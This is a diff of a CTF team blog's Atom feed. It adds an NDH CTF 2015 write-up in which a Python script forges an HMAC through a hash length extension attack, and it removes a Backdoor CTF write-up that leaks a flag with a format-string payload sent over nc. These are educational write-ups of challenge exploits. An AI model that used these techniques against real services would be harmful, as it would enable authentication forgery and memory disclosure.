@@ -4,7 +4,7 @@
   <title><![CDATA[Category: Ctf | GeeksSpeak Team Blog]]></title>
   <link href="http://geeksspeak.github.io/blog/categories/ctf/atom.xml" rel="self"/>
   <link href="http://geeksspeak.github.io/"/>
-  <updated>2015-04-06T01:57:27+04:30</updated>
+  <updated>2015-04-06T16:59:28+04:30</updated>
   <id>http://geeksspeak.github.io/</id>
   <author>
     <name><![CDATA[GeeksSpeak]]></name>
@@ -12,6 +12,157 @@
   </author>
   <generator uri="http://octopress.org/">Octopress</generator>
 
+  
+  <entry>
+    <title type="html"><![CDATA[NDH CTF 2015 - Weshgrow Writeup]]></title>
+    <link href="http://geeksspeak.github.io/blog/2015/04/06/ndh-ctf-2015-weshgrow-writeup/"/>
+    <updated>2015-04-06T16:58:41+04:30</updated>
+    <id>http://geeksspeak.github.io/blog/2015/04/06/ndh-ctf-2015-weshgrow-writeup</id>
+    <content type="html"><![CDATA[<p><strong>NDH 2015 Weshgrow Writeup</strong><br/>
+<strong>Point = 300</strong><br/>
+<strong>Category = Crypto</strong></p>
+
+<p>By openning the url we redirected to following link:</p>
+
+<blockquote><p><a href="http://weshgrow.challs.nuitduhack.com/?hmac=ca8473d35a80a5ca4e9f3555c2869f71">http://weshgrow.challs.nuitduhack.com/?hmac=ca8473d35a80a5ca4e9f3555c2869f71</a></p></blockquote>
+
+<p>As we know HMAC is a cryptographic message for authenticating using a secret key. So this has been made of something.</p>
+
+<p>Also we could find another HMAC in the page source as you can see:</p>
+
+<blockquote><p><a href="http://weshgrow.challs.nuitduhack.com/admin?hmac=fac0887096a54ac497d968daf4c4fe0b">http://weshgrow.challs.nuitduhack.com/admin?hmac=fac0887096a54ac497d968daf4c4fe0b</a></p></blockquote>
+
+<p>if you open the /flag address without the purposed HMAC you see redirection to <code>address+"#missinghmac"</code>.</p>
+
+<p>So this could be HMAC of pages and we should prepare a HMAC for <code>flag</code>.</p>
+
+<p>By going further into login page, we noticed after submiting the form, HMAC of the password sent to the page not the password itself. it used BHE class in <code>bhe.js</code> as mentioned &ldquo;Best Hash Ever&rdquo;.</p>
+
+<pre><code>var BestHashEver = function() {
+    this.state = [
+        str2bigInt('1336226589', 10),
+        str2bigInt('251977347', 10),
+        str2bigInt('716107527', 10),
+        str2bigInt('1774966033', 10),
+    ];
+};
+BestHashEver.prototype.bhe_round = function(byte) {
+    var c = str2bigInt('162888806', 10);
+    console.log(c);
+    for (var i=3; i&gt;0; i--) {
+        this.state[i] = mod(add(mult(this.state[0], this.state[i]), mult(this.state[0], int2bigInt(byte, 10))), str2bigInt('4294967295', 10));
+        console.log(this.state[i]);
+    }
+    this.state[0] = mod(add(mult(this.state[0], c), mult(this.state[1], int2bigInt(byte, 10))), str2bigInt('4294967295', 10));
+};
+BestHashEver.prototype.dword2hex = function(dw) {
+    var hexchars = ["0", "1","2","3","4","5","6","7","8","9","a","b","c","d","e","f"];
+    var output = '';
+    var c1 = '', c2=''
+    for (var i = 0; i &lt; 4; i++) {
+        byte = dw &amp; 0x0000000F;
+        c1 = hexchars[byte];
+        dw = (dw &gt;&gt; 4);
+        byte = dw &amp; 0x0000000F;
+        c2 = hexchars[byte];
+        dw = (dw &gt;&gt; 4);
+        output = output + c2 + c1;
+    }
+    console.log(output);
+    return output;
+};
+BestHashEver.prototype.hash = function(data) {
+    for (var i = 0; i &lt; data.length; i++){
+        this.bhe_round(data.charCodeAt(i));
+        console.log(this.state);
+    }
+    /* Generate output. */
+    var digest = [
+        parseInt(bigInt2str(this.state[0], 10)),
+        parseInt(bigInt2str(this.state[1], 10)),
+        parseInt(bigInt2str(this.state[2], 10)),
+        parseInt(bigInt2str(this.state[3], 10)),
+    ];
+    return this.dword2hex(digest[0]) + this.dword2hex(digest[1]) + this.dword2hex(digest[2]) +
+    this.dword2hex(digest[3]);
+};
+function hmac(data) {
+    _bhe = new BestHashEver();
+    return _bhe.hash(data);
+}
+</code></pre>
+
+<p>The Hash like md5 has four state variables and multiple rounds which in each round based on previous values and variables, formulas generate a new state variables and change them. Also it has four initialize state value as default.</p>
+
+<p>In this Algorithm each round is for every character of inputs which at the end output produced by hex and concatenation of final state variable.</p>
+
+<p>But there is some flaw in the algorithm such as not using length of input and &hellip;</p>
+
+<p>This means if we know the state variable value for some string <code>s</code>, we can continue the rounds and produce the output of <code>s+x</code> for any <code>x</code>. this attack mentioned as <code>hash length extension attack</code>.</p>
+
+<p>It&rsquo;s obvious that we can obtain state variable&#8217; value from HASH(s). The reader should notice that int the <code>bhe.js</code> <strong>Big Endian byte order</strong> has been used.</p>
+
+<p>So we have:</p>
+
+<pre><code>Hash(s+x, default initialize state value) = Hash(s, state value of hash(s))
+</code></pre>
+
+<p>based on what discussed earlier and some knowledge about HMAC our scenario is:</p>
+
+<pre><code>HMAC(message)= Hash(secret + message)
+</code></pre>
+
+<p>which page name will be used as <code>message</code>. As you saw we have valid HMAC for empty(NULL) page name, so:</p>
+
+<pre><code>HMAC("") = Hash(secret)
+
+HMAC("flag") = Hash(s, state value of HMAC(""))
+</code></pre>
+
+<p>In order to obtain the proper HMAC i wrote a python script but it can be done by changing default value in js too.</p>
+
+<pre><code>def convert2be(s):#convert to big endian byte order
+    return s[6:8]+s[4:6]+s[2:4]+s[0:2]
+
+def myhex(s):
+    return convert2be(hex(s)[2:-1].rjust(8,'0'))
+
+def hash(inp,state=[1336226589,251977347,716107527,1774966033]):
+    a,b,c,d=state[0],state[1],state[2],state[3]
+    m=4294967295
+    for x in inp:
+        x=ord(x)
+        aa=(a*(162888806+x*(b+x)))%m
+        bb=(a*(b+x))%m
+        cc=(a*(c+x))%m
+        dd=(a*(d+x))%m
+        a,b,c,d=aa,bb,cc,dd
+    return myhex(a)+myhex(b)+myhex(c)+myhex(d)
+
+emptyhmac="ca8473d35a80a5ca4e9f3555c2869f71" #hmac("")
+
+import re
+emptystate=map(lambda x:int(convert2be(x),16),re.findall('.'*8,emptyhmac))
+
+print hash("flag",emptystate)
+</code></pre>
+
+<p>by executing the script we have the following HMAC:</p>
+
+<pre><code>$ python weshgrow-sol.py                                                                                                                                                                      
+3f6933240ae234edddc27544d949238c  
+</code></pre>
+
+<p>by opening the following url we have the flag:</p>
+
+<blockquote><p>/flag?hmac=3f6933240ae234edddc27544d949238c</p>
+
+<p>FLAG ? FLAG !
+Can_I_haz_s3cureD_hm4c_plz?</p></blockquote>
+
+<p>by <code>f02</code></p>
+]]></content>
+  </entry>
   
   <entry>
     <title type="html"><![CDATA[NDH CTF 2015 - Facesec Writeup]]></title>
@@ -323,107 +474,6 @@ logs/2015-04-04_admin
 <blockquote><p>Well played, here is your flag : zEpbiUFt5p7m84cxOxN6</p></blockquote>
 
 <p>Interesting challenge So we&rsquo;ve got 200pts.</p>
-
-<p>HAMIDx9</p>
-]]></content>
-  </entry>
-  
-  <entry>
-    <title type="html"><![CDATA[Backdoor CTF 2015 - TEAM Writeup]]></title>
-    <link href="http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-team-writeup/"/>
-    <updated>2015-04-03T03:16:39+04:30</updated>
-    <id>http://geeksspeak.github.io/blog/2015/04/03/backdoor-ctf-2015-team-writeup</id>
-    <content type="html"><![CDATA[<p><strong>Backdoor 2015 TEAM Writeup</strong><br/>
-<strong>Point = 600</strong><br/>
-<strong>Category = Exploit</strong></p>
-
-<blockquote><p>There is a wierd kind of authentication service running: nc hack.bckdr.in 8004. The binary can be found here. The vampire says that there is no need for bruteforce.</p></blockquote>
-
-<pre><code>$ file team
-team: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked (uses shared libs), for GNU/Linux 2.6.24, BuildID[sha1]=3fb6836dc9249bd1e7c33e023d563ff429d7dca4, stripped
-$ checksec.sh --file team
-RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
-Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   team
-</code></pre>
-
-<p>Ok looking into the binary in IDA shows us two function <code>0x08048769</code> and <code>0x080486ad</code> are important to us. the first one can be seen bellow:</p>
-
-<!--more-->
-
-
-<pre><code>int sub_8048769()
-{
-  const char *v0; // ST18_4@1
-  const char *v1; // ST1C_4@1
-
-  v0 = (const char *)malloc(0xC8u);
-  v1 = (const char *)malloc(0x64u);
-  printf("Enter teamname: ");
-  fflush(stdout);
-  __isoc99_scanf("%200s", v0);
-  printf("Enter flag: ");
-  fflush(stdout);
-  __isoc99_scanf("%100s", v1);
-  sleep(2u);
-  sub_80486AD(v0, v1);
-  free((void *)v0);
-  free((void *)v1);
-  return 0;
-}
-</code></pre>
-
-<p>As you can see there is no potential flaw so we skip to second one:</p>
-
-<pre><code>signed int __cdecl sub_80486AD(const char *a1, const char *a2)
-{
-  signed int result; // eax@2
-  int v3; // edx@7
-  FILE *stream; // [sp+24h] [bp-74h]@1
-  char s; // [sp+28h] [bp-70h]@3
-  int v6; // [sp+8Ch] [bp-Ch]@1
-
-  v6 = *MK_FP(__GS__, 20);
-  stream = fopen("flag.txt", "r");
-  if ( stream )
-  {
-    fgets(&amp;s, 100, stream);
-    printf(a1);
-    if ( !strcmp(&amp;s, a2) )
-      puts(" : correct flag!");
-    else
-      puts(" : incorrect flag. Try again.");
-    fclose(stream);
-    result = 0;
-  }
-  else
-  {
-    result = 1;
-  }
-  v3 = *MK_FP(__GS__, 20) ^ v6;
-  return result;
-}
-</code></pre>
-
-<p>interesting! in this function flag.txt will be opened and read but the important part is <code>printf(a1);</code>. remember previous function <code>a1</code> is the <code>v0</code> var which have the teamname! So there is a <em>Format String Vulnerability</em>. And the abuse is pretty simple, just printing the stack addresses to leak the flag:</p>
-
-<pre><code>$ cat 5
-%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p
-A
-
-$ cat 5 | nc hack.bckdr.in 8004
-Enter teamname: Enter flag: 0x640x9dd11400xf770ec20(nil)0x10x9dd10d80x9dd10080xf773855c0x9dd11400x356633640x643630310x376531390x323461370x383565620x636135300x613835640x643862310x313164610x383766610x356363660x313833660x666432630x363336350x353335390x626631370x80483000x1(nil)0x1(nil)(nil)0xff8b30880xf772b5000x10x5fc69000(nil)(nil)0xff8b3088 : incorrect flag. Try again.
-</code></pre>
-
-<p>you can see that
-<code>
-0x356633640x643630310x376531390x323461370x383565620x636135300x613835640x643862310x313164610x383766610x356363660x313833660x666432630x363336350x353335390x62663137
-</code>
-is our flag. using python <code>struct</code> module for all gives us this one:</p>
-
-<pre><code>[redacted]
-</code></pre>
-
-<p>which added 600pts to our points.</p>
 
 <p>HAMIDx9</p>
 ]]></content>
